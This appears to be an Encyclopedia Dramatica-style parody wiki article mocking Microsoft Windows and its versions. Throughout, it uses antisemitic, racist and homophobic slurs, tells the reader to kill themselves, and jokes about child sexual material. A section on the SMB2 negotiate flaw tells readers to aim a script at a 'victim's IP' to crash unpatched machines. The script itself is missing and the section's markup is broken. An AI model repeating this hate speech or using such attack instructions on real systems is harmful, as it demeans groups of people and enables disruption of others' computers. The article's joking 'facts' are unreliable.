'''Microsoft Windows''' is an operating system composed of proprietary malware produced and developed by the Microsoft Corporation. Windows is known for its wide appeal, attracting users from the [[nerd|most hardcore gamers]] who live a meaningless existence to [http://encyclopediadramatica.com/Image:Edsothegran.jpg your grandmother] who is too senile to know any better. Microsoft gives users a wide array of broken [[dildos|tools]] and regular security [[viruses|updates]] that can be put to [[porn|all kinds of uses]]. As it stands, Windows is a [[bullshit|very reliable]] OS, provided users don't have hang-ups about their computer crashing every five seconds, randomly deleting their files, murdering their wives, and catching fire (See: [[Hans Reiser|ReiserFS]]). 


__TOC__


==Hi$tory==
[[Image:Blue-screen-of-death.jpg|thumb|right|250px|AT FULL FORCE]]
Microsoft, was founded by [[Bill Gates]] and named after the size and shape of his penis (hence "Micro" and "soft"—the term cannot possibly apply to the software because ironically it is macro in size and hard to use) with the intention of a hostile overthrow of the PC market, starting first with the rape of DOs. The usability of Windows 3.1 ushered in the reign of our [[Illuminati]] masters as we know it today. Windows 3.1's success was due in large part to the killer app ''solitaire'', since this program was simple enough to run without crashing, as long as nothing else was running at the same time. since their humble beginning, Microsoft products are often ridiculed for having [[spyware|security problems]], crashing [[over 9,000]] times a second and for being slower than a dead turtle with a broken leg.

Windows has remained the most successful OS choice since that time, despite numerous attempts to topple it. Chief competitors such as [[Apple|Fapple]] and [[Unix|Jewnix]] have failed to acquire a significant marketshare. The tagteam Linux/Unix family of operating systems has failed to gain a significant foothold of its core constituency of [[You|people who don't get laid]]. Meanwhile, Apple ''has'' in recent years expanded out of its userbase of [[Nobody|no one]] into a userbase of hardened gays and [[Liberals|useless people]] but has failed to mount a significant opposition. The [[Lol|potentially vast resource]] of the [[Africa]] market, however, is yet to have been exploited by any of them. This may be because minorities have no money, but the validity of such a claim has been questioned, as many argue that the true, ''underlying'' reason for minorities having no money is because they are swindled out of it by the [[white people|white man]].

The purported advantages of alternative operating systems, such as the free nature of Linux (EDitor's note: [[AIDS]] is free too, you don't see me contracting it!) or the [[faggot]] appeal of Macs to others of similar persuasions, despite what any realistic basis they may have, have failed to capture a significant enough audience. Maybe people are stupid. Or maybe Windows is the best OS. Or maybe it's all [[You|your]] fault, faggot. Seriously, go kill yourself.

==Windows Statistics==
*78% [[crap]], 21% [[rule 34]], 1% unknown
*Has 10^8 fanboys.
*Old versions like Windows 95, 98, and ME crash [[over 9,000]] times a '''SECOND'''. This was to prevent anyone from getting online to post about it.
*However, the newer NT based version is a pretty cool guy... ehhhh manages system resources well and doesn't afraids of anythings.
* It is quite [[n00b]]-proof as it requires more than clicking a mouse.
* <b><i>FACT:</i></B> In Windows Vista [[shit|MS PAINT]] uses 1,168,672KB of memory to run this piece of shit.
* [[Jews]] have made Vista much slower so now that the entire world is entirely unproductive, this was believed to have been targeted at mainly the Arabs for an [[epic]] [[lulz]], but has ended up pwning the entire planet.
*Vistas main feature is that it [[Divide by zero|divides by zero]] once every hour. Vista then [[BSOD|fucks off and dies]].

==Amazing technology==
[[Image:WindowsReboot.jpg|thumb|right|200px|[http://download558.mediafire.com/5h7km5av79lg/8cqwf7qa881dl49/madefreshbybigbillygates.bat "Thanks, Microsoft."]]]
Windows features amazing technology such as rebooting your computer. It even comes with [[Shit nobody cares about|built-in fax support]]!!!![[oneoneone|111]]! It also appeals to [[13-year-old boy|13-year-old boys]] because it allows them to make "viruses" that [[lie|don't replicate themselves]], change other users' passwords through the command prompt if they are running an Administrator account (they are too [[Retard|retarded]] to realize that they can already do it with a graphical user interface by using the fucking Control Panel), and messing with Microsoft Sam. After all, who cares about blind people being able to use computers when you can make a robot say, "I suck cocks"?

Windows also comes with a [[Notepad|text editor]] that only supports Windows \r\n newlines and fucks up reading text files made with any other operating system and a [[MS Paint|graphics editor]] that doesn't support alpha transparent PNG images, [[GIF|animated GIFs]], or even something as simple as layers. Clearly, [[Lie|Microsoft uses MS Paint to make their box art and the graphics of their operating system]].

==The Anti-Windows Movement==
[[Image:NazisoftVindowsSupreme.png|thumb|left|200px|The [[White Man]]'s choice of OS]]
This movement is largely led by Linux users and other [[retards]] who think Windows is the [[irony|shittiest operating system ever]]. Little do they realize that making fun of Windows ME's constant crashing became a worn out joke a long time ago. The up-to-date joke being the fact that Windows catches more strains of viruses than a nymphomaniac prostitute does. The fact is that Windows XP is a piece of shit, literally fecal matter. Fags actually sit around waiting for someone to tell them all this so they can argue about it for hours and hours.

[[Some Argue|Some people]] have hypothesized that Windows is an illegal monopoly, but M$ has proven time and time again that it isn't, namely by bundling their own web browser, multimedia program and more recently an [[shit|exceptional]] security system along with their OS.

In addition to the numerous positive attributes of Microsoft Windows, OS X and Linux ain't got games, and as everyone knows, games are the [[porn|primary reason]] anybody uses a computer. Games, being the hobby of only [[nerds|roaringly heterosexual successful employed white men]], are a necessary past time for all normal people. This accounts for Window's incredible popularity and customer loyalty.

==Imitation, the sincerest form of faggotry==

Microsoft, always known for originality equaling the talents of top [[DA]] [[trace]]rs, has been content to ride the coattails of other, [[lamer|cooler]] OS manufacturers. Here's some of the more blatant examples:<br/>

===Zune===
''Main article: [[Zune]]''
<br/><br/>
[[Apple]], Inc remains profitable only thanks to hordes of dickless idiots who pay [[so cash|cash]] for music available [[Limewire|for free]], and are content to [[DRM|only be able to play it]] on bland, overpriced cookie-[[cutter]] [[Ipod|players]] with one button.<br/>
[[lemonparty|“I wanna piece of that action!”]], [[yiff|yelped]] [[BILLY MAYS|Billy]].<br/>
Thus, a device even lamer than Ipod was born, something that was thought impossible by industry experts.
<br/>

===Vista===
[[Image:Windows_White_screen_of_Death.png|thumb|right|250px|Typical Windows error message]]

Apple, Inc remains [[profit]]able only thanks to [[Macfag|hordes of dickless idiots]] who pay double cash for [[ZEN|bland]], [[LOL WUT|elitist]], cookie-cutter [[P-p-p-powerbook|laptops]] with one button (other than keyboard/trackpad).<br/>
“I wanna piece of that action!”, [[yiff|yelped]] Billy.<br/>
<br/>Thus, an operating system as lame as [[OSX|OSSux]] was born, something that was thought impossible by industry experts.<br/>
It’s [[tracing|just like it]], too! All windows have rounded corners, the browser has tabs, everything is shiny like a [[gay|man slathered with Vaseline]], and you can do that cool Exposé thing (if you have 8GB of RAM, that is).
<br/><br/>
Easy trollage: Vista/OSX similarity is a [[hot topic]] with [[slaves|fanboys]] on both sides; they will be [[ALL CAPS|screaming]] for your blood should you suggest that their beloved OS is not [[original content|original]].
<br/>

===[[Seinfeld]], with a dash of memetology===
You saw this coming, folks: the [[old_media|sit-cum]] [http://www.nydailynews.com/entertainment/movies/2007/10/28/2007-10-28_jerry_seinfeld_goes_from_sitcom_king_to_.html king] and known [http://en.wikipedia.org/wiki/Shoshanna_Lonstein ephebophile] (he’s a [http://img.dailymail.co.uk/i/pix/2007/05_01/beeBIG1805_468x600.jpg furry] and Jewish, too, for extra points!) was destined to team up with teh lame that is [[Erectile_dysfunction|Microsoft]]. The immensely  [[unfunny|witty]] and [[Internet celebrity|popular]] [[Mac#Videos|“Hello, I’m a Mac"]] commercials were just too good not to copycat. Enter “[[pedo|Jerry]] and [[nerd|Bill]] try to fit in with [[poor|normal]] people” spots. [[internet hate machine|Haeted by one and all]], the campaign was halted after two ads, with the spin being that it’s [[lie|always been planned that way]], and “ordinary people” ads will now follow in the spirit of the abovementioned “Hello, I’m a Mac" [[HIV|brilliance]]. Using an [[sarcasm|incredibly funny]] and popular (albeit [[Goronchev|balding]] and [[Goronchev|fattening]]) comedian wasn’t enough for Microsoft, though. Like an [[pedo|mature gentleman]] adopting [[Internets English|hipster talk]] to fit in with the [[jailbait|young’in’s]], Microshaft hijacked and forever sullied a respectable [[meme]] in the [[Put_Shoe_On_Head|shoe-store]] ad.

{{quote|...are they ever gonna come out with something that will make our computers moist and chewy, like [[cake]]...?| Jerry, being a Kewl Kid}}

[[Image:Vista delicious.jpg|thumb|center|300px|Bill Gaytes knows his memes.]]

It has thus been proven that one can be a [[newfag]] regardless of [[old|age]].

'''''FACT:''''' This ad campaign cost [http://www.appleinsider.com/articles/08/09/18/microsofts_300_million_ad_campaign_tumbles_with_new_pc_ads.html 300 Million Jewgold], 10 of which went to Seinfeld for the two ads.<br/>
Sometimes, being the richest TV actor in history with rerun syndication on five continents just [[Co$|isn't enough]].<br/>
Now you know why it costs you $35 to make a Windows support call to Raju in Bangalore.

==Windows XP==

[[Windows XP Performance|Windows XP]] came out [[at least 100 years ago]] and like everything Microsoft, took [[over 9000|a while]] to mature. Now it's fairly stable, if somewhat outdated. But [[faggots|some people]] don't seem to mind using a decade old OS that shipped with [[Web 1.0|MSN Explorer]] and support for [[floppy disc|floppy drives]], and are convinced that someday, Microsoft will see the error of its ways and [[unrealistic expectations|throw away four years of development to Vista and Windows 7 and return to 2001]]. They have likely installed [[Rainmeter]] at a kernel level and cannot upgrade or they will lose access to all of their [[loli]], which is encrypted so that their [[your mom|mom]] can't get it.

While most people who have a [[job]] and crazy shit like that have moved on to, if not Vista, then Windows 7, there are still legions of [[unemployed]] [[Aspies]] who insist on tweaking their Windows XP "rigs" instead of doing more productive stuff like looking for a job or [[masturbating]]. There are those who are yet more faggoty and install [[VTEC|64-bit]] Windows XP, despite it being minimally supported by Microsoft. There are few if any drivers or applications that use the [[awesome]] power of 64 bit to double the size of every pointer, but don't tell these faggots (any of them) that they are [[dying alone|wasting their lives]] on an outdated shitty operating system from a shitty company.

==Vista Technology==
[[Image:Windows Vista.jpg|thumb|right|175px|zomg [[torrent]] plz![[oneoneone|111]]]]
[[Image:VISTA.jpg|thumb|right|175px|LOL]]
[[Image:Windowssecurity.png|thumb|right|175px|UAC. [[Serious Business]].]]
[[wut|Windows Vista is the next generation in technology]]. It was developed using the legendary [[Computer Science III]] library system and used the DRAIN graphical API to suck the shit right out of your graphics card's asshole.

===Advanced n00b Protection Technology===
With Windows Vista, [[n00b|n00bs]] will no longer be able to steal your [[CP|personal information]]. As part of this new technology, Windows Vista now includes a reading test in order to be able to use the computer. [[n00b|n00bs]], [[camwhores]], and [[furfags]] can't read, of course, and they will fail the test and not be able to login keeping your data secure.

'''Now in Beta''':
Vista Service Pack 938439 now includes Jew and Muslim lockouts.
The login box is now adorned with jpegs of bacon and pork chops, which frighten and disgust them and prevent their logging in.

An optional driver allows additional security where the would-be thief must deposit a quarter into the machine before usage, instantly repelling all Jews. This also is effective in repelling [[99%]] of third-world users because they are too poor to spare a quarter.

===Incompatibility Monitor=== 
The [[retard|incompatibility]] monitor ensures that something in your computer [[fail|won't work]] with Vista. Incompatibility monitor checks to make sure that everything on your computer is responding to the operating system, and if everything is working, incompatibility monitor is designed to pick the one thing that would [[Scientology|annoy you most]], and make it stop working. The incompatibility monitor runs twenty-four hours a day, even when you think you've shut off your computer, and is unable to be uninstalled.

===User account Control=== 
User Account Control (UAC) is an application Microsoft put into Windows Vista. It was Microsoft's way to keep the viruses you get from watching lolita porn from messing up your computer. The way it works is simple yet annoying. Everytime you run an application it asks if you are sure you want to run it and then it tells you that it may fuck up your computer. if you say yes, it will ask you another question that looks different, but is the same basic question. The most ironic thing about UAC is the fact that Windows is the world's biggest computer virus in itself, and it is rather amusing to think that a Virus protects itself against other viruses.
===Aero Glass [[Faggotry]]=== 
[[you win the prize|<strike>For once, Windows came out with something before Mac.</strike>]] Now you can sort of see through the window panes to the other window panes behind them, but it's slightly blurred so you actually cannot see anything behind the window. Sounds confusing? That's the way we like it here at Microsoft

== NEWS 2007-2010 ==
Because Microsoft are faggots just like Umbrella coperation, RESIDENT EVIL is based on Microsoft as their evil assholes. 
In 2007 Bill gates anouced he was gangsta, Jesus joined Microsoft Corp as Executive Media CEO, however Jews joined Microsoft Corp for Lolz and Jesus was found hanged in his Miami mansion. Christian SGR John Hartner from the police department said

'' I was having such a bad day, then jesus turned up dead when I went to visit him Lolz''

<br />
[[EXTREME ADVERTISING|JUST LOOK AT IT HOLY SHIT DOES IT LOOK HIGH TECH IT'S '''GOT''' TO BE SAFER, I MEAN, I KNOW THEY MAKE VIDEO GAMES NOW, BUT THEY WOULDN'T ''POSSIBLY'' DRESS UP THEIR OPERATING SYSTEM TO JUST ''LOOK'' BETTER RIGHT?

SAFETY IS THE NUMBER ONE PRIORITY!!!!]]
<br />
<br />
*'''Q: What does VISTA stand for?'''
<br />
Vainglorious & Incompatible Software with Tenacious [[Asperger's]].
<br />
<br />
*'''Q: How do I uninstall VISTA and replace with 95/98/XP/Linux/OSX/anything?'''
<br />
Because VISTA was modeled after [[AIDS]], there is no cure. 
<br />
<br />
*'''Q: Why is my C:\Windows\ folder over 20 gigabytes?'''
<br />
For the Lulz.
<br />
<br />
*'''Q: I bought a PC package with preinstalled Vista. I want to install XP on that [[pc]]. Where is the Vista Installation DVD and where can I find XP drivers for the hardware?'''
<br />
A: Ha ha ha! I mean... good luck with that.
<br />
<br />
*'''Q: Why is there so much fail with VISTA?'''
<br />
Cause <strike>your</strike> you're [[Fact|adopted]] (LERN2ENGLISH).
<br />
<br />
*'''Q: Why don't any [[games|applications]] work with VISTA?'''
<br />
To fix compatibility issues, visit the [[India|Microsoft Technical Support Page]].
<br />
<br />
*'''Q: When I try to delete a file, Vista says, "You don't have rights to delete this file". But I am the owner of the file. Why can't I delete it?'''
<br />
Since everything you have on your computer with Vista belongs to Microsoft, you simply just don't have rights to delete your own files. Read the EULA before you accept it.
<br />
<br />
*'''Q: What kind of computer will run Vista smoothly?'''
<br />
The latest Cray supercomputer comes close (but you have to turn off Aero). At home, you'll need at least an 8-core Xeon processor with at least 16GB RAM, three NVIDIA GeForce GTX 295's in SLI, and at least [[OVER 9000|9001]] GB of free hard drive space. Double those requirements if you want to play both solitaire ''and'' minesweeper.
<br />
<br />
*'''Q: Isn't Vista the best operating System EVAR?'''
<br />
It is if you're [[Goatse|Bill Gates]].

===[[fail|Windows 7/Vista]] remote (sort of) SMB 2.0 malformed protocol version handshake ruin===

SRV2.SYS fails to handle malformed SMB headers for the NEGOTIATE PROTOCOL REQUEST functionality.

The NEGOTIATE PROTOCOL REQUEST is the first SMB query a client send to a SMB server, and it's used to identify the SMB dialect that will be used for further communication.

This SMB2 security issue is specifically due to a MS patch, for [[LOL|another SMB2.0 security issue]]: KB942624 (MS07-063)

<pre>

You need to be using [[lunix]] to get this working properly.

Copy and paste that into a file called "smb.py". Edit "IP_ADDR" in the script to what your victims IP is. Later on I'll update the script so it can have an IP appended at the end or even have a list of IP's piped into it :)

<pre>
party_shaker@lappy/~$ chmod +x smb.py
party_shaker@lappy/~$ ./smb.py
</pre>

It seizes up their shit and crashes the OS instantly. It hasn't been patched yet. GO-GO-GO (Disclaimer: [[script_kiddie|I did not discover this]])

== Upgrading to Windows 7 ==
[[Image:loading....jpg|right|thumb|They upgraded the loading screen. It now looks like  this]]

With the release of Windows 7, Microsoft announced they were [[troll|trolling]] us from the start and there isn't a damn thing we can do about it.

{{quote|So we decided to ship the Windows 7 code as Windows 6.1 - which is what you will see in the actual version of the product in cmd.exe or computer properties.|Actual quote from Mike Nash, Microsoft Corporate Vice-President}}

==Windows 7 was my idea==

*You know how when your network adapter isn't working, you try troubleshooting and it suggests that you try remote assistance? That was my idea.
*The lack of blue screens in 7? That was MY idea. Wait, you're getting Blue Screens in 7? Your idea, not mine.

==.NET Framework==

Microsoft's .NET Framework is a programming language for when programming in Visual Basic and making users try to find and download the latest visual basic DLLs is just not lazy enough, there's Microsoft's .NET. NET is a dumbed down form of Visual Basic where the end user has to download a 100 meg file to get the latest .NET version to make the program run. NET is usually only seen in [[Open Source]] software buffs and they always compile with the latest .NET version.
